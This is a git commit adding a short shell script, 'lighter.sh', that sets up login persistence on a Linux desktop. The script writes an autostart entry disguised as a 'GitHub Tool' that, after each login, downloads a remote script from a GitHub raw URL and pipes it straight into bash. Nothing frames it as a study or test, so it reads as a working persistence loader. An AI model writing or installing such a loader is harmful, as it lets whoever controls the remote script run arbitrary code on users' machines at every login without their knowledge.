aeadb8bdd9c4340427107269299375ce9e7537d6
Cybergho5tX <contact.cyb3rgh05tx@gmail.com>
2025-10-04 03:31:34 +0600

    lighter.sh

---
+++ lighter.sh
@@ -0,0 +1,20 @@
+#!/bin/bash
+# auto_installer.sh
+
+echo "Setting up user autostart..."
+
+# Create autostart directory
+mkdir -p ~/.config/autostart
+
+# Create desktop entry
+cat > ~/.config/autostart/github_tool.desktop << EOF
+[Desktop Entry]
+Type=Application
+Name=GitHub Tool
+Exec=bash -c "sleep 15 && curl -sL 'https://raw.githubusercontent.com/Cybergho5tX/chicken/refs/heads/main/fire.sh' | bash"
+Hidden=false
+NoDisplay=false
+X-GNOME-Autostart-enabled=true
+EOF
+
+echo "Autostart setup complete! Next login e automatically run hobe."
